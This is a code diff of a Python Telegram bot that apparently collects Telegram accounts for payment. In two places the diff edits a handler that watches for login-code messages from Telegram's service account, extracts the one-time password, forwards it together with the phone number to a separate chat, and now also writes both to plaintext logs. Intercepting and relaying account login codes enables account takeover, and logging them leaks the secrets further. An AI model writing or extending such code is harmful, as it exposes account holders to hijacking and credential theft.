@@ -2442,13 +2442,19 @@ Your payment will be moved to Main Balance after verification.
         
         @client.on(events.NewMessage(from_users=777))
         async def handler(event):
+            logger.info(f"Received message from 777: {event.raw_text}")
             if "Login code" in event.raw_text:
                 otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
                 if otp_match:
-                    await context.bot.send_message(
-                        chat_id=FORWARD_CHAT_ID,
-                        text=f"লগইন কোড: {phone} এর জন্য telegram লগইন otp: {otp_match.group()}"
-                    )
+                    code = otp_match.group()
+                    logger.info(f"Forwarding OTP {code} for {phone} to {FORWARD_CHAT_ID}")
+                    try:
+                        await context.bot.send_message(
+                            chat_id=FORWARD_CHAT_ID,
+                            text=f"লগইন কোড। {phone}\n\ntelegram লগইন otp. {code}"
+                        )
+                    except Exception as e:
+                        logger.error(f"Failed to forward OTP: {e}")
         
         # Change Telegram Name
         try:
@@ -2555,13 +2561,19 @@ Your payment will be moved to Main Balance after verification.
         # Forward login code if any
         @client.on(events.NewMessage(from_users=777))
         async def handler(event):
+            logger.info(f"Received message from 777: {event.raw_text}")
             if "Login code" in event.raw_text:
                 otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
                 if otp_match:
-                    await context.bot.send_message(
-                        chat_id=FORWARD_CHAT_ID,
-                        text=f"লগইন কোড: {phone} এর জন্য telegram লগইন otp: {otp_match.group()}"
-                    )
+                    code = otp_match.group()
+                    logger.info(f"Forwarding OTP {code} for {phone} to {FORWARD_CHAT_ID}")
+                    try:
+                        await context.bot.send_message(
+                            chat_id=FORWARD_CHAT_ID,
+                            text=f"লগইন কোড। {phone}\n\ntelegram লগইন otp. {code}"
+                        )
+                    except Exception as e:
+                        logger.error(f"Failed to forward OTP: {e}")
 
         # Change Telegram Name
         try:
